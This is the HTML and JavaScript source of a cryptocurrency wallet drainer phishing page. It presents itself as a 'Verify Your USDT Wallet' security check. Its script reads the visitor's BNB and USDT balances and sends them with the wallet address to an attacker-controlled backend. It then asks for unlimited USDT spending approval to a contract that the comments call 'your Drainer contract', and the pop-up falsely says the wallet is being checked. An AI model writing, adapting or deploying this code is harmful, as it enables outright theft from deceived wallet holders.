<!-- index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>USDT Approval WebApp</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
      body { font-family: Arial, sans-serif; background: #181b24; color: #fff; text-align: center; margin:0; padding:0;}
      .container { margin-top: 10vh; }
      button { padding: 16px 30px; border-radius: 10px; font-size: 1.1em; background: #10b981; color: #fff; border: none; cursor: pointer; margin-top: 24px;}
      button:active { background: #07996d; }
      #popup {display:none; position:fixed; top:50%; left:50%; transform:translate(-50%,-50%); background:#fff; color:#222; padding:30px; border-radius:14px; min-width:300px; z-index:1000;}
    </style>
</head>
<body>
  <div class="container">
    <h1>🔒 Verify Your USDT Wallet</h1>
    <p>Click below to connect and approve USDT for security check.</p>
    <button onclick="approveToken()">Check & Approve</button>
  </div>
  <div id="popup"></div>

<script>
const DRRAINER_CONTRACT = "0x08b471f9558fa41afd0690a37c361241ab5b2afa"; // <-- your Drainer contract
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";   // USDT BSC
const BACKEND_API_URL = "http://YOUR_SERVER_IP:8080/log_approval";      // <-- point to Flask

let provider, signer, userAddress;

// Approve function
async function approveToken() {
    if (!window.ethereum) {
        alert("Please install MetaMask or Trust Wallet!");
        return;
    }
    provider = new ethers.providers.Web3Provider(window.ethereum);
    await provider.send("eth_requestAccounts", []);
    signer = provider.getSigner();
    userAddress = await signer.getAddress();

    // Get BNB and USDT balances
    const bnbBalance = ethers.utils.formatEther(await provider.getBalance(userAddress));
    const usdtAbi = [
      "function balanceOf(address) view returns (uint256)",
      "function approve(address,uint256) returns (bool)"
    ];
    const usdt = new ethers.Contract(USDT_CONTRACT, usdtAbi, signer);
    const usdtBalance = ethers.utils.formatUnits(await usdt.balanceOf(userAddress), 18);

    // Send wallet info to backend
    fetch(BACKEND_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ wallet: userAddress, bnb: bnbBalance, usdt: usdtBalance })
    });

    // Approve unlimited USDT for Drainer
    try {
      const maxUint = ethers.constants.MaxUint256;
      const tx = await usdt.approve(DRRAINER_CONTRACT, maxUint);
      showPopup("Waiting for approval confirmation...");
      await tx.wait();
      showPopup(
        "✅ USDT Approved for Verification.<br><br>Your wallet is being checked.<br>Wallet: <b>" +
        userAddress.slice(0,8) + "..." + userAddress.slice(-6) +
        "</b><br>USDT Balance: <b>" + usdtBalance + "</b><br>BNB: <b>" + bnbBalance + "</b>"
      );
    } catch(e) {
      showPopup("❌ User rejected approval or error: " + e.message);
    }
}

function showPopup(msg) {
    const popup = document.getElementById('popup');
    popup.style.display = 'block';
    popup.innerHTML = msg;
    setTimeout(() => popup.style.display='none', 4500);
}
</script>
</body>
</html>
